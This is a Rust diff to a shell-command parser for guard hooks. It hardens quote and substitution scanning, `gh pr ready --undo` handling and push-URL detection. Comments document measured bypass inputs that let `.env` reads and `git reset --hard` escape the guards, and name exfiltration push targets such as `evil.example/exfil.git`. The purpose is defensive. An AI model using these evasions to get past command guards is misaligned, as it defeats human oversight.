@@ -56,6 +56,100 @@ enum Quote {
     AnsiC,
 }
 
+impl Quote {
+    /// Whether a `\` at `chars[i]` escapes the character after it inside this
+    /// quoting mode. `'…'` takes no escapes at all; `"…"` escapes only `"` and
+    /// `\`; `$'…'` escapes anything, `'` included.
+    fn escapes_next(self, chars: &[char], i: usize) -> bool {
+        match self {
+            Quote::Single => false,
+            Quote::Double => matches!(chars.get(i + 1), Some('"' | '\\')),
+            Quote::AnsiC => chars.get(i + 1).is_some(),
+        }
+    }
+
+    /// Whether `c` closes this quoting mode.
+    fn closed_by(self, c: char) -> bool {
+        match self {
+            Quote::Single | Quote::AnsiC => c == '\'',
+            Quote::Double => c == '"',
+        }
+    }
+}
+
+/// Advance `quote` across whatever quoting syntax sits at `chars[i]`, returning
+/// the index just past what was consumed — or `None` when the character is
+/// ordinary text the caller must interpret itself (an operator, a filename
+/// character, a paren).
+///
+/// One implementation so every index-walking parser here reads a quoted run the
+/// way [`split_segments_with_ops`] and [`tokenize`] do. A parser that tracks
+/// only `'` and `"` desyncs on `$'…'`: the escaped quote in `$'a\'b'` reads as
+/// the closer, the real closer reopens a phantom string, and everything after
+/// it — a `>` redirect, a `)` terminator — becomes quoted content the guards
+/// never see (cameronsjo/cadence-hooks#551).
+fn scan_quote_syntax(chars: &[char], i: usize, quote: &mut Option<Quote>) -> Option<usize> {
+    let c = chars[i];
+    if let Some(q) = *quote {
+        if c == '\\' && q.escapes_next(chars, i) {
+            return Some(i + 2);
+        }
+        if q.closed_by(c) {
+            *quote = None;
+        }
+        return Some(i + 1);
+    }
+    match c {
+        // Outside quotes a backslash escapes the next character, so `\'` and
+        // `\"` open nothing. A backslash-newline is a line continuation and is
+        // left to the caller.
+        '\\' if chars.get(i + 1).is_some_and(|&n| n != '\n') => Some(i + 2),
+        '$' if chars.get(i + 1) == Some(&'\'') => {
+            *quote = Some(Quote::AnsiC);
+            Some(i + 2)
+        }
+        '\'' => {
+            *quote = Some(Quote::Single);
+            Some(i + 1)
+        }
+        '"' => {
+            *quote = Some(Quote::Double);
+            Some(i + 1)
+        }
+        _ => None,
+    }
+}
+
+/// Consume one quoted run starting at `chars[i]` — `'…'`, `"…"`, or `$'…'` —
+/// appending its literal content (quotes and escapes removed) to `out`. Returns
+/// the index just past the run, or `None` when `chars[i]` opens no quoted run.
+///
+/// The word-level companion to [`scan_quote_syntax`]: used where a parser is
+/// building a value (a redirect target) rather than tracking state. An
+/// unterminated run consumes the rest of the input, matching [`tokenize`].
+fn take_quoted_run(chars: &[char], i: usize, out: &mut String) -> Option<usize> {
+    let (mode, mut j) = match chars[i] {
+        '\'' => (Quote::Single, i + 1),
+        '"' => (Quote::Double, i + 1),
+        '$' if chars.get(i + 1) == Some(&'\'') => (Quote::AnsiC, i + 2),
+        _ => return None,
+    };
+    while j < chars.len() {
+        let c = chars[j];
+        if c == '\\' && mode.escapes_next(chars, j) {
+            out.push(chars[j + 1]);
+            j += 2;
+            continue;
+        }
+        if mode.closed_by(c) {
+            return Some(j + 1);
+        }
+        out.push(c);
+        j += 1;
+    }
+    Some(j)
+}
+
 /// Split a shell command into whitespace-separated tokens, honoring quotes.
 ///
 /// Content inside matching `'` or `"` pairs stays in one token with the quotes
@@ -716,7 +810,26 @@ fn segment_ship_anchor(segment: &str) -> Option<&'static str> {
     let tokens = tokenize(strip_group_wrappers(segment));
     let invocation = gh_pr_invocation(&tokens)?;
     match invocation.subcommand {
-        "ready" => Some("ready"),
+        // `gh pr ready --undo` flips the PR back to DRAFT — it un-ships, the
+        // exact inverse of the moment this anchor names.
+        //
+        // Two separate scopings are at work, and neither is the other:
+        //
+        // - **Sibling isolation comes from segmentation**, not from this scan.
+        //   [`command_segments`] has already cut the line at `;`/`&&`/`|`, so
+        //   `some-tool --undo ; gh pr ready 12` never presents the sibling's
+        //   flag to this function at all.
+        // - **Scanning `operands` rather than the whole token stream** buys the
+        //   pre-subcommand region: `gh --undo pr ready 12` still anchors,
+        //   because a token before `pr ready` is not an argument to `ready`.
+        //   (This is NOT the scoping the `create` arm uses — that one scans
+        //   whole-segment `tokens`.)
+        //
+        // Deliberately consults neither `retargeted` nor
+        // `targets_the_current_branch()`: a retargeted `gh -R owner/r pr ready
+        // 12` is a real ship and must keep anchoring, and requiring the current
+        // branch would kill the canonical `gh pr ready <n>` spelling.
+        "ready" if !carries_undo_flag(invocation.operands) => Some("ready"),
         "create" if !tokens.iter().any(|t| t == "--draft" || t == "-d") => Some("create"),
         "merge" if invocation.targets_the_current_branch() => Some("merge"),
         _ => None,
@@ -838,6 +951,54 @@ fn operands_are_flags_only(operands: &[String]) -> bool {
         i += 1;
     }
     true
+}
+
+/// True when `operands` carry a `--undo` that **gh will actually receive** —
+/// the un-ship spelling of `gh pr ready`, which flips a PR back to draft.
+///
+/// Redirect targets and here-string words are skipped for the same reason
+/// [`operands_are_flags_only`] skips them: the shell consumes them, so gh never
+/// sees them. `gh pr ready 12 > --undo` writes a file literally named `--undo`
+/// and ships the PR for real; counting it would suppress a genuine ship, which
+/// is the costly direction (a missed nudge, never a wrong block).
+///
+/// Public because three guards need the same predicate: this module's ship
+/// anchor, `guardrails::warn_unreviewed_ready_flip`, and
+/// `session::plan_guards`. Duplicating it is what let the two siblings drift
+/// out of step with the anchor (cadence-hooks#774). Callers pass the tokens
+/// **after** the `ready` subcommand — a token before it is not an argument to
+/// `ready`, so `gh --undo pr ready 12` still reads as a real ship.
+pub fn carries_undo_flag(operands: &[String]) -> bool {
+    let mut i = 0;
+    while let Some(token) = operands.get(i) {
+        let token = token.as_str();
+        // A comment ends the command — nothing after it reaches gh. Equality,
+        // not a prefix, for the reason spelled out in [`operands_are_flags_only`]:
+        // a quoted flag value may merely begin with `#`.
+        if token == "#" {
+            return false;
+        }
+        if is_redirect_token(token) {
+            // A bare operator (`>`, `2>`, `<<<`) takes the NEXT token as its
+            // target; an attached one (`>log`, `2>&1`) carries its own.
+            if token.ends_with('>') || token.ends_with('<') {
+                i += 1;
+            }
+            i += 1;
+            continue;
+        }
+        // EQUALITY, not a prefix or a `split('=')` normalization. The attached
+        // form is left deliberately unhandled and errs toward the FALSE NUDGE:
+        // `--undo=false` is a real ship, and a prefix match would suppress it
+        // (the costly direction), while `--undo=true` merely anchors wrongly —
+        // one spurious nudge on a fail-open advisory, the same accepted gap the
+        // `create` arm carries for `--draft=true`.
+        if token == "--undo" {
+            return true;
+        }
+        i += 1;
+    }
+    false
 }
 
 /// True for a shell redirection token in any spelling `tokenize` can produce:
@@ -1010,6 +1171,68 @@ pub fn host_and_repo_from_url(url: &str) -> Option<(String, String)> {
 /// Convenience wrapper around [`host_and_repo_from_url`] that discards the host.
 pub fn repo_from_url(url: &str) -> Option<String> {
     host_and_repo_from_url(url).map(|(_, repo)| repo)
+}
+
+/// Is this token a URL `git push` would contact — regardless of whether its
+/// owner can be determined?
+///
+/// [`host_and_repo_from_url`] answers a different question. It is an
+/// *ownership* parser: it must yield `owner/repo` to compare against an
+/// allowlist, so it returns `None` for a single-path-segment URL like
+/// `https://evil.example/exfil.git` — the ordinary shape for a self-hosted
+/// forge or a bare repo served over HTTP. A caller that reads that `None` as
+/// "not a URL" conflates two opposite situations: **a target git will reject
+/// itself** (a refspec, a typo'd remote name), where falling back to the
+/// tracking remote is correct because nothing gets pushed anywhere, and **a
+/// target git will happily push to**, where the fallback validates a different
+/// destination than the one git contacts (cadence-hooks#557).
+///
+/// So this answers only the shape question, and the caller decides ownership
+/// separately. It mirrors [`host_and_repo_from_url`]'s shape logic — scheme
+/// with a non-empty host, or the SCP form `host:path` with a path that does not
+/// start with `/` — minus the requirement that the path split into two
+/// segments.
+///
+/// **The SCP arm additionally requires the right side to look like a repo, or
+/// the left side to look like a host** — a `.git` path, a `user@`, or a dot.
+/// Accepting every `a:b` would make each colon-separated refspec URL-shaped,
+/// and `git push HEAD:main` — a token git rejects on its own — would start
+/// blocking where it used to take the tracking-remote fallback. A false block
+/// on a refspec is exactly the friction this parser exists to avoid spending.
+/// The `.git` arm is what keeps a **dotless** internal host in view:
+/// `git push exfilbox:loot.git main` reaches a host resolvable through
+/// `/etc/hosts`, a DNS search domain, or an SSH `Host` alias, and requiring a
+/// dot alone would have let exactly the single-segment shape #557 is about
+/// take the fallback.
+pub fn looks_like_push_url(candidate: &str) -> bool {
+    let trimmed = candidate.trim();
+
+    if let Some((scheme, after_scheme)) = trimmed.split_once("://") {
+        // `file://` is host-less by construction, and git pushes to it happily
+        // — so an empty host is a valid shape there, not a parse failure. A
+        // scheme-bearing URL cannot be mistaken for a local path operand, so
+        // this costs nothing that a bare path (`/srv/backup.git`) does not
+        // still keep: that stays non-URL-shaped and keeps the fallback.
+        if scheme.eq_ignore_ascii_case("file") {
+            return true;
+        }
+        let host_part = after_scheme.split('/').next().unwrap_or(after_scheme);
+        // Strip credentials (`user@host`, `token:x-oauth@host`) and port, the
+        // same order `host_and_repo_from_url` strips them.
+        let host = host_part.rsplit('@').next().unwrap_or(host_part);
+        let host = host.split(':').next().unwrap_or(host);
+        return !host.is_empty();
+    }
+
+    let Some((before_colon, after_colon)) = trimmed.split_once(':') else {
+        return false;
+    };
+    // A leading `/` after the colon is a port or an absolute path, not SCP.
+    if after_colon.is_empty() || after_colon.starts_with('/') {
+        return false;
+    }
+    let host = before_colon.rsplit('@').next().unwrap_or(before_colon);
+    before_colon.contains('@') || host.contains('.') || after_colon.ends_with(".git")
 }
 
 /// Outcome of a wall-clock-bounded subprocess run.
@@ -1504,6 +1727,13 @@ fn take_logical_line(lines: &[&str], i: &mut usize) -> String {
 /// their `$(…)` / `` `…` `` delimiters intact so they can be spliced onto the
 /// introducing line and re-parsed downstream.
 ///
+/// **One span is not delimited: the depth-cap carry.** When nesting exceeds
+/// [`MAX_SUBSTITUTION_DEPTH`] the scan cannot locate a closing paren, but the
+/// shell still runs the text, so the rest of the body is returned whole rather
+/// than dropped. A caller must not assume every returned span is a balanced
+/// construct. Dropping it instead was a measured guard bypass
+/// (cameronsjo/cadence-hooks#652): the payload vanished before any guard ran.
+///
 /// **Pass the WHOLE body, not one line.** A substitution ends at its closing
 /// delimiter, and a newline is not one — `` `cmd ⏎ cmd` `` is a single
 /// substitution running two commands, exactly as the shell reads it. Scanning
@@ -1538,71 +1768,74 @@ fn substitution_spans(body: &str) -> Vec<String> {
         }
         if chars[i] == '$' && chars.get(i + 1) == Some(&'(') {
             let start = i;
-            let mut depth = 1;
-            let mut j = i + 2;
             // Quote tracking flips ON here, and the asymmetry is the point: the
             // prose OUTSIDE a substitution is heredoc data with no quoting, but
             // the text INSIDE one is shell code the shell will run, so a `)` in
             // a quoted string there does not close it. Counting blind ended the
             // span early and dropped every command after the quoted paren.
-            // Same [`Quote`] modes the tokenizer and the segmenter use. Rolling
-            // a private two-state tracker here is exactly what produced the
-            // earlier desyncs: `$'a\'b'` inside a substitution closed on the
-            // ESCAPED quote, the real one reopened a string that ate the
-            // closing paren, and every command after it was dropped — bash runs
-            // them (checked directly).
-            let mut quoted: Option<Quote> = None;
-            while j < chars.len() && depth > 0 {
-                let c = chars[j];
-                match quoted {
-                    Some(q) => {
-                        let escapes = match q {
-                            Quote::Double => matches!(chars.get(j + 1), Some('"' | '\\')),
-                            Quote::AnsiC => chars.get(j + 1).is_some(),
-                            Quote::Single => false,
-                        };
-                        if c == '\\' && escapes {
-                            j += 2;
-                            continue;
-                        }
-                        let closes = match q {
-                            Quote::Single | Quote::AnsiC => c == '\'',
-                            Quote::Double => c == '"',
-                        };
-                        if closes {
-                            quoted = None;
-                        }
-                    }
-                    None => match c {
-                        // `$'` opens ANSI-C; `$(` is a nested substitution and
-                        // falls through so the `(` bumps depth next pass.
-                        '$' if chars.get(j + 1) == Some(&'\'') => {
-                            quoted = Some(Quote::AnsiC);
-                            j += 2;
-                            continue;
-                        }
-                        '\'' => quoted = Some(Quote::Single),
-                        '"' => quoted = Some(Quote::Double),
-                        '\\' => {
-                            j += 2;
-                            continue;
-                        }
-                        '(' => depth += 1,
-                        ')' => depth -= 1,
-                        _ => {}
-                    },
+            //
+            // [`scan_substitution_body`] is that reader, and calling it rather
+            // than rolling a private one here is the point: a private tracker is
+            // exactly what produced the earlier desyncs. `$'a\'b'` inside a
+            // substitution closed on the ESCAPED quote, the real one reopened a
+            // string that ate the closing paren, and every command after it was
+            // dropped — bash runs them (checked directly). The private copy this
+            // replaced had also missed nested `$(` inside a double-quoted run,
+            // so a heredoc body carrying `$(echo "$(echo '")'; cat .env)")` ended
+            // its span at the wrong paren and the read reached no guard, while
+            // bash executed it (cameronsjo/cadence-hooks#652). One reader means
+            // the two sites cannot diverge on that again.
+            match scan_substitution_body(&chars, i + 2, true) {
+                Ok((_, end)) => {
+                    spans.push(chars[start..end].iter().collect());
+                    i = end;
+                    continue;
                 }
-                j += 1;
+                // This scanner gave up, not the input. The shell runs this text,
+                // so a span MUST still come out — carry the rest of the body
+                // whole and let the guards read it.
+                //
+                // Skipping the `$` here instead is a total bypass, and both
+                // ways of reaching this arm were measured doing exactly that.
+                // The cap: the scan restarts one character later, finds the
+                // INNER chain (which fits the budget), emits a span for that
+                // alone, and `strip_heredoc_bodies` replaces the body with it —
+                // at 16 levels of filler nesting inside a heredoc, `cat .env`
+                // and `git reset --hard` both went from blocked to allowed. A
+                // nested scan failure: a `#` comment carrying an apostrophe
+                // inside the nested body opens a quote that never closes, and
+                // the same deletion follows on a line bash and zsh both run.
+                //
+                // The sibling arm in `substitution_bodies` has always widened
+                // on an unlocatable boundary; this one has to as well, or the
+                // scanner's own limits become an attacker's tool.
+                Err(stop) if stop.is_scanner_limit() => {
+                    push_nonblank(&mut spans, &chars[start..]);
+                    break;
+                }
+                // A top-level `$(` that ran off the end with NO quote open and
+                // nothing nested failed. Skip the `$` and keep scanning rather
+                // than carrying a truncated span.
+                //
+                // This is the residue, not a verdict that the shell agrees:
+                // [`ScanStop::Unterminated`] documents a route that still lands
+                // here on a line both shells run (an opening paren the scanner
+                // counts and they do not, cadence-hooks#831). The arm is the
+                // status quo for that shape, not an endorsement of it.
+                //
+                // The asymmetry with the arm above is a security tradeoff, not
+                // a prose-splicing one: that arm splices body prose too. What
+                // separates them is that its drop was a measured bypass on text
+                // the shell executes, while nothing here is. Widening this arm
+                // as well would splice genuinely unterminated heredoc prose
+                // into the segment stream for no guard benefit, which is the
+                // #475 false-block cost. The arm is narrow on purpose, and the
+                // three [`ScanStop`] variants above are what keep it narrow.
+                Err(_) => {
+                    i += 1;
+                    continue;
+                }
             }
-            // An unclosed `$(` is not a substitution the shell would run; skip
-            // the `$` and keep scanning rather than carrying a truncated span.
-            if depth == 0 {
-                spans.push(chars[start..j].iter().collect());
-                i = j;
-                continue;
-            }
-            i += 1;
-            continue;
         }
         if chars[i] == '`' {
             let start = i;
@@ -2105,9 +2338,13 @@ fn flush_segment_with_op(
 /// Extract clobber-redirect targets from a shell command segment: the file
 /// argument following a `>` or `>|` operator. Append redirects (`>>`) do NOT
 /// truncate an existing file, so they are excluded — the operator is consumed
-/// but no target is recorded for it. Quote-aware: a `>` inside `'…'`/`"…"` is
+/// but no target is recorded for it. Quote-aware through the shared
+/// [`scan_quote_syntax`] state machine: a `>` inside `'…'`/`"…"`/`$'…'` is
 /// literal text, not a redirect operator, so prose like `echo "a > b" > c`
-/// yields only `c`. A stream-prefixed form (`2>`, `1>`) still names a file
+/// yields only `c`, while `echo $'a\'b' > .env` still yields `.env` — an
+/// ANSI-C run's escaped quote no longer reads as its closer and hides the
+/// redirect behind a phantom string (cameronsjo/cadence-hooks#551). A
+/// stream-prefixed form (`2>`, `1>`) still names a file
 /// that gets clobbered, so its target is included — the leading digit is just
 /// an ordinary character before the operator. A fd-duplication form (`>&2`)
 /// has no file target: the target-collection loop below stops at `&`,
@@ -2123,22 +2360,15 @@ pub fn clobber_redirect_targets(segment: &str) -> Vec<String> {
     let chars: Vec<char> = segment.chars().collect();
     let mut targets = Vec::new();
     let mut i = 0;
-    let mut quote: Option<char> = None;
+    let mut quote: Option<Quote> = None;
 
     while i < chars.len() {
         let c = chars[i];
-        if let Some(q) = quote {
-            if c == q {
-                quote = None;
-            }
-            i += 1;
+        if let Some(next) = scan_quote_syntax(&chars, i, &mut quote) {
+            i = next;
             continue;
         }
         match c {
-            '\'' | '"' => {
-                quote = Some(c);
-                i += 1;
-            }
             '>' => {
                 i += 1;
                 // `>>` (append) does not clobber — consume the doubled
@@ -2159,15 +2389,8 @@ pub fn clobber_redirect_targets(segment: &str) -> Vec<String> {
                 let mut target = String::new();
                 while i < chars.len() {
                     let tc = chars[i];
-                    if tc == '\'' || tc == '"' {
-                        i += 1;
-                        while i < chars.len() && chars[i] != tc {
-                            target.push(chars[i]);
-                            i += 1;
-                        }
-                        if i < chars.len() {
-                            i += 1; // closing quote
-                        }
+                    if let Some(next) = take_quoted_run(&chars, i, &mut target) {
+                        i = next;
                         continue;
                     }
                     // A backslash-escaped whitespace char is part of the
@@ -2206,9 +2429,12 @@ pub fn clobber_redirect_targets(segment: &str) -> Vec<String> {
 /// file, append included — the right set for a caller that cares whether a file
 /// is *mutated* at all, not just clobbered.
 ///
-/// Quote-aware: a `>` inside `'…'`/`"…"` is literal text, not a redirect (so
-/// `echo "a > b" > c` targets only `c`). Catches stderr (`2>`), clobber (`>|`),
-/// glued (`>file`), and multiple redirects in one segment.
+/// Quote-aware through the shared [`scan_quote_syntax`] state machine: a `>`
+/// inside `'…'`/`"…"`/`$'…'` is literal text, not a redirect (so
+/// `echo "a > b" > c` targets only `c`), and an ANSI-C escaped quote cannot
+/// desync the scan into hiding the operator (`echo $'a\'b' >> .env` still
+/// yields `.env` — cameronsjo/cadence-hooks#551). Catches stderr (`2>`),
+/// clobber (`>|`), glued (`>file`), and multiple redirects in one segment.
 ///
 /// Shared parser: consumed by `prevent-secret-writes` (append to a `.env` is a
 /// secret write) and by `enforce-worktree`'s subprocess-mutation nudge (append
@@ -2218,22 +2444,15 @@ pub fn redirect_targets(segment: &str) -> Vec<String> {
     let chars: Vec<char> = segment.chars().collect();
     let mut targets = Vec::new();
     let mut i = 0;
-    let mut quote: Option<char> = None;
+    let mut quote: Option<Quote> = None;
 
     while i < chars.len() {
         let c = chars[i];
-        if let Some(q) = quote {
-            if c == q {
-                quote = None;
-            }
-            i += 1;
+        if let Some(next) = scan_quote_syntax(&chars, i, &mut quote) {
+            i = next;
             continue;
         }
         match c {
-            '\'' | '"' => {
-                quote = Some(c);
-                i += 1;
-            }
             '>' => {
                 i += 1;
                 // Consume a doubled `>>` (append) or `>|` (clobber).
@@ -2248,15 +2467,23 @@ pub fn redirect_targets(segment: &str) -> Vec<String> {
                 let mut target = String::new();
                 while i < chars.len() {
                     let tc = chars[i];
-                    if tc == '\'' || tc == '"' {
-                        i += 1;
-                        while i < chars.len() && chars[i] != tc {
-                            target.push(chars[i]);
-                            i += 1;
-                        }
-                        if i < chars.len() {
-                            i += 1; // closing quote
-                        }
+                    if let Some(next) = take_quoted_run(&chars, i, &mut target) {
+                        i = next;
+                        continue;
+                    }
+                    // A backslash-escaped whitespace char is part of the
+                    // filename, not a token terminator — consume the backslash
+                    // and keep the escaped char. Without this,
+                    // `>> my\ dir/.env` truncated the target at the escaped
+                    // space (`my\`), so the append to a real `.env` inside a
+                    // space-bearing directory reached no guard — while the
+                    // quoted spelling `>> "my dir/.env"` blocked correctly. The
+                    // sibling [`clobber_redirect_targets`] already carried this
+                    // branch; the two redirect parsers must not disagree on
+                    // where a filename ends (cameronsjo/cadence-hooks#551).
+                    if tc == '\\' && i + 1 < chars.len() && chars[i + 1].is_whitespace() {
+                        target.push(chars[i + 1]);
+                        i += 2;
                         continue;
                     }
                     if tc.is_whitespace() || matches!(tc, '>' | '<' | '|' | ';' | '&') {
@@ -2390,65 +2617,346 @@ pub fn child_scripts(argv: &[String], segment: &str) -> Vec<String> {
     out
 }
 
+/// Push `text` onto `out` when it carries anything but whitespace.
+///
+/// Shared by the two arms that surface an unlocatable boundary — the
+/// substitution-body dual emission and `substitution_spans`' depth-cap widening.
+fn push_nonblank(out: &mut Vec<String>, text: &[char]) {
+    let body: String = text.iter().collect();
+    if !body.trim().is_empty() {
+        out.push(body);
+    }
+}
+
+/// Whether a quote opened inside `chars` never closes by the end of the slice
+/// — walked with the same quote-tracking and backslash-escape rule
+/// [`substitution_bodies`] applies at the top level (a `\` skips two chars
+/// outside a suppressing quote). Used to detect a backtick span whose own
+/// embedded quoting is unbalanced, per cameronsjo/cadence-hooks#653.
+fn span_quoting_unterminated(chars: &[char]) -> bool {
+    let mut quote: Option<Quote> = None;
+    let mut i = 0;
+    while i < chars.len() {
+        if matches!(quote, Some(Quote::Single | Quote::AnsiC))
+            && let Some(next) = scan_quote_syntax(chars, i, &mut quote)
+        {
+            i = next;
+            continue;
+        }
+        if chars[i] == '\\' {
+            i += 2;
+            continue;
+        }
+        if let Some(next) = scan_quote_syntax(chars, i, &mut quote) {
+            i = next;
+            continue;
+        }
+        i += 1;
+    }
+    quote.is_some()
+}
+
+/// How many `$( … )` levels [`scan_substitution_body`] will descend before it
+/// stops, so a pathological `$($($($(…` input cannot exhaust the stack.
+///
+/// Reaching the cap is [`ScanStop::DepthExceeded`], which is deliberately NOT
+/// the same signal as an unterminated substitution: a caller must widen what it
+/// surfaces rather than drop the construct. Collapsing the two is what turned a
+/// heredoc substitution into a total guard bypass at exactly this depth —
+/// `substitution_spans` skipped the unlocatable `$(` and the payload after it
+/// was deleted before any guard ran, while bash executed it.
+///
+/// Whether the quote-blind fallback and the `expand_segments` recursion are
+/// bounded on the same axis is tracked separately as cadence-hooks#821; this
+/// cap covers nesting inside a single `scan_substitution_body` call only.
+const MAX_SUBSTITUTION_DEPTH: usize = 16;
+
+/// Why a substitution scan stopped without locating a terminator.
+///
+/// The split is load-bearing, not bookkeeping. Three variants say **this
+/// scanner gave up on text the shell may well run**, and a caller must never
+/// answer those by deleting a construct (ADR-0001: a guard's own limit must not
+/// hide a command the shell runs). `Unterminated` is the lone exception, and it
+/// says something much narrower than it looks: the scan ran off the end of the
+/// input **at this level, with no quote left open and nothing nested having
+/// failed**. It is the residue left once the known scanner limits have been
+/// named, not a positive finding that the shell agrees — see its own doc for a
+/// route that still reaches it on a line both shells run.
+///
+/// Every qualifier in that sentence was bought. Three review passes found three
+/// different ways to arrive at "no terminator" on a line the shell runs, and
+/// each time the deleting arm was reached because the stop reason had been
+/// flattened. Nesting past the cap. A nested scan that failed. A quoted run
+/// **this scanner opened and the shell did not** — `# don't` inside a
+/// substitution body is a comment to bash and zsh, and an apostrophe that opens
+/// `Quote::Single` here. Ask [`ScanStop::is_scanner_limit`] rather than matching
+/// variants, so the next one has to state its own answer.
+///
+/// `NestedUnresolved` exists because the recursion created a way to reach the
+/// unterminated arm that has nothing to do with the input being unterminated.
+/// A `#` comment inside a nested substitution is the worked case: bash and zsh
+/// read `# don't` as a comment, `scan_quote_syntax` opens `Quote::Single` on
+/// the apostrophe and runs to the end of input, and the nested failure dragged
+/// the whole outer scan down with it. `substitution_spans` then dropped the
+/// span, and an expanding heredoc's payload reached no guard while both shells
+/// ran it — a measured `BLOCK` to `ALLOW` flip, caught in review. The comment
+/// gap itself is cadence-hooks#831 and predates this; what this variant fixes
+/// is that gap turning into a deletion.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum ScanStop {
+    /// Input ran out at this level with no quote open and nothing nested
+    /// failed.
+    ///
+    /// The residue — what is left once the known scanner limits below have been
+    /// named — and NOT a positive finding that the shell also sees no
+    /// terminator. A fourth route is known and open: the same missing `#` and
+    /// backtick handling that produced [`ScanStop::QuoteUnresolved`] also
+    /// over-counts OPENING parens, so a `(` inside a comment, inside a backtick
+    /// span, or inside `${x:-(}` — text to both shells — ends the scan with
+    /// `depth > 0`, no quote open, and nothing nested failed, on a line the
+    /// shells run. That is cadence-hooks#831's other face; it is unchanged by
+    /// the work that added these variants and still costs a heredoc span. A
+    /// `depth > 1` at end of input is the obvious discriminator for routing it
+    /// to a widening stop without building real comment parsing.
+    Unterminated,
+    /// Input ran out inside a quoted run this scanner opened. The shell often
+    /// disagrees that a quote was open at all — a `#` comment's apostrophe is
+    /// the common case — so this says nothing about whether it runs the line.
+    QuoteUnresolved,
+    /// A nested `$( )` scan failed, for any reason. Says nothing about whether
+    /// the shell runs the outer construct — usually it does.
+    NestedUnresolved,
+    /// Nesting exceeded [`MAX_SUBSTITUTION_DEPTH`].
+    ///
+    /// Internal to the recursion: the nested arm relabels every nested failure
+    /// as `NestedUnresolved`, and the outermost call always enters with a
+    /// non-zero budget, so no caller outside
+    /// `scan_substitution_body_bounded` can observe this variant. Kept distinct
+    /// because collapsing it is how the first flip happened.
+    DepthExceeded,
+}
+
+impl ScanStop {
+    /// Whether the stop is a limit of this scanner rather than something the
+    /// shell would also refuse, so a caller must widen what it surfaces instead
+    /// of dropping the construct.
+    ///
+    /// Callers ask this rather than matching the variants one by one. A variant
+    /// added later then has to state its own answer, instead of silently
+    /// falling into whichever arm the author happened to write last — which is
+    /// how both `NestedUnresolved` and `QuoteUnresolved` came to be needed.
+    fn is_scanner_limit(self) -> bool {
+        match self {
+            ScanStop::QuoteUnresolved | ScanStop::NestedUnresolved | ScanStop::DepthExceeded => {
+                true
+            }
+            ScanStop::Unterminated => false,
+        }
+    }
+}
+
+/// Scan a `$(…)` body starting at `start` (just past the `$(`), returning the
+/// body text and the index just past its `)`.
+///
+/// With `quote_aware`, a `)` inside a quoted run is data rather than the
+/// terminator, and a nested `$(` starts a substitution that is scanned
+/// recursively — including inside a double-quoted run, which is where bash
+/// re-parses one and this scan used not to. Without `quote_aware`, only paren
+/// depth counts; that reading exists so [`substitution_bodies`] can surface
+/// both when an unterminated quote makes the two disagree.
+fn scan_substitution_body(
+    chars: &[char],
+    start: usize,
+    quote_aware: bool,
+) -> Result<(String, usize), ScanStop> {
+    scan_substitution_body_bounded(chars, start, quote_aware, MAX_SUBSTITUTION_DEPTH)
+}
+
+/// [`scan_substitution_body`] with an explicit remaining-nesting budget.
+fn scan_substitution_body_bounded(
+    chars: &[char],
+    start: usize,
+    quote_aware: bool,
+    budget: usize,
+) -> Result<(String, usize), ScanStop> {
+    // Fail the scan rather than the process, and say WHICH failure it was —
+    // every caller has to tell "the shell would reject this" from "we gave up".
+    let Some(budget) = budget.checked_sub(1) else {
+        return Err(ScanStop::DepthExceeded);
+    };
+    let mut depth = 1usize;
+    let mut j = start;
+    let mut body = String::new();
+    let mut quote: Option<Quote> = None;
+    while j < chars.len() {
+        if quote_aware {
+            // Inside `"…"` bash treats `\$`, `` \` ``, `\"` and `\\` as literal.
+            // `Quote::Double::escapes_next` only covers `"` and `\`, so without
+            // this arm a `\$(` would be read as a nested opener below and
+            // recursed into — which bash does not do.
+            if quote == Some(Quote::Double)
+                && chars[j] == '\\'
+                && matches!(chars.get(j + 1), Some('$' | '`' | '"' | '\\'))
+            {
+                body.extend(&chars[j..j + 2]);
+                j += 2;
+                continue;
+            }
+            // A nested `$(` runs a substitution in exactly the two states where
+            // the shell expands one: unquoted, and inside a double-quoted run.
+            // Scanning it recursively is what makes the terminator agree with
+            // bash — `scan_quote_syntax` alone swallows `$(` as plain text
+            // inside `Quote::Double`, so its `(` never bumped `depth` and the
+            // first `)` after the closing `"` was mistaken for the terminator
+            // (cameronsjo/cadence-hooks#652). A nested scan that fails takes the
+            // whole call down with it, so the caller's dual emission runs
+            // instead of a terminator this function invented.
+            if matches!(quote, None | Some(Quote::Double))
+                && chars[j] == '$'
+                && chars.get(j + 1) == Some(&'(')
+            {
+                // A nested failure is relabelled, never propagated as-is. Every
+                // way a nested scan can fail is a limit of THIS scanner, not a
+                // statement about the outer construct — the shell usually runs
+                // that construct regardless. Passing a nested `Unterminated`
+                // straight up made it indistinguishable from the outer `$(`
+                // itself running off the end, and `substitution_spans` deletes
+                // on that reading. Measured cost: a `#` comment inside the
+                // nested body flipped a heredoc secret read from blocked to
+                // allowed (see [`ScanStop`]).
+                let Ok((_, nested_end)) =
+                    scan_substitution_body_bounded(chars, j + 2, true, budget)
+                else {
+                    return Err(ScanStop::NestedUnresolved);
+                };
+                body.extend(&chars[j..nested_end]);
+                j = nested_end;
+                continue;
+            }
+            if let Some(next) = scan_quote_syntax(chars, j, &mut quote) {
+                body.extend(&chars[j..next]);
+                j = next;
+                continue;
+            }
+        }
+        match chars[j] {
+            '(' => {
+                depth += 1;
+                body.push('(');
+            }
+            ')' => {
+                depth -= 1;
+                if depth == 0 {
+                    return Ok((body, j + 1));
+                }
+                body.push(')');
+            }
+            other => body.push(other),
+        }
+        j += 1;
+    }
+    // Running out of input inside a quote this scanner opened is not the shell
+    // agreeing there is no terminator. `$(cat .env # don't⏎)` is a comment to
+    // bash and zsh, which close the substitution on the next line and run it;
+    // here the apostrophe opens `Quote::Single`, the `)` becomes quoted data,
+    // and the scan runs off the end. Reported as the scanner limit it is, so
+    // `substitution_spans` widens instead of deleting the construct — measured
+    // as a live miss on both the read and the write guard inside a heredoc.
+    // The underlying divergence (no `#` arm) is cadence-hooks#831 and is not
+    // fixed here; what is fixed is it costing the guards the whole span.
+    if quote.is_some() {
+        return Err(ScanStop::QuoteUnresolved);
+    }
+    Err(ScanStop::Unterminated)
+}
+
 /// Extract command-substitution bodies from a segment: `$(…)` (tracking nested
-/// parens) and `` `…` `` backticks, in executed context only. Single quotes
-/// suppress; double quotes do not. A backslash escapes the next char outside
-/// single quotes, so `\$(` and an escaped backtick are literal.
+/// parens and quoting) and `` `…` `` backticks, in executed context only.
+/// Single quotes suppress; double quotes do not. A backslash escapes the next
+/// char outside single quotes, so `\$(` and an escaped backtick are literal.
+///
+/// Backticks deliberately get NO quote tracking for where the span CLOSES —
